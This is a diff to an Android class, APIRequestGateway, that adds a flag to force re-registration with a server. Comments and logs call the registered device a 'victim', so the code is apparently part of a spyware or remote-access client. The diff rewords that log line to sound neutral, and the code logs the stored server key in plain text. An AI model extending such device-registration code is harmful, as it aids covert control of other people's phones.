@@ -53,19 +53,22 @@ public class APIRequestGateway {
     @NonNull
     private final APIRequestGatewayCallback callback;
 
-    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback) {
+    private final boolean isFreshApiRequest;
+
+    private APIRequestGateway(Context context, final Activity activity, @NonNull APIRequestGatewayCallback callback, boolean isFreshApiRequest) {
         this.context = context;
         this.activity = activity;
         this.callback = callback;
+        this.isFreshApiRequest = isFreshApiRequest;
         execute();
     }
 
-    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback) {
-        this(activity.getBaseContext(), activity, callback);
+    public APIRequestGateway(final Activity activity, APIRequestGatewayCallback callback, boolean isFreshApiRequest) {
+        this(activity.getBaseContext(), activity, callback, isFreshApiRequest);
     }
 
-    public APIRequestGateway(Context context, APIRequestGatewayCallback callback) {
-        this(context, null, callback);
+    public APIRequestGateway(Context context, APIRequestGatewayCallback callback, boolean isFreshApiRequest) {
+        this(context, null, callback, isFreshApiRequest);
     }
 
 
@@ -174,7 +177,7 @@ public class APIRequestGateway {
             final PrefUtils prefUtils = PrefUtils.getInstance(context);
             final String serverKey = prefUtils.getString(KEY_SERVER_KEY);
 
-            if (serverKey != null) {
+            if (serverKey != null && !isFreshApiRequest) {
 
                 Log.d(X, "hasServerKey " + serverKey);
 
@@ -191,7 +194,7 @@ public class APIRequestGateway {
 
             } else {
 
-                Log.i(X, "Registering victim...");
+                Log.i(X, isFreshApiRequest ? "Refreshing server..." : " Registering server...");
 
                 //Register victim here
                 register(context);
